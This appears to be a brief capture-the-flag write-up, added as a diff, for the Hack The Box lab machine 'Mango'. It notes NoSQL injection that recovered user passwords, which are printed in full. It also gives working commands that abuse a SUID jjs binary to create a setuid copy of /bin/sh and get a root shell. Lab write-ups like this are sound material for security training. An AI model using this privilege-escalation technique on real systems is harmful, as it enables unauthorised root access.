@@ -1,0 +1,15 @@
+//Scripts and writeup based on MinatoTW
+//After enumerating the website, got staging-order.mango.htb
+//It is vulnerable to NoSQL injection in MongoDB. After running he scripts got these users:
+Password for admin found: t9KcS3>!0B#2
+Password for mango found: h3mXK8RhU~f{]f5H
+
+//Can't SSH as admin, but can ssh as mango and "su admin". got admin shell
+
+//PrivEsc
+//SUID files: jjs
+jjs
+Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
+Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
+exit()
+/tmp/sh -p	//got root shell
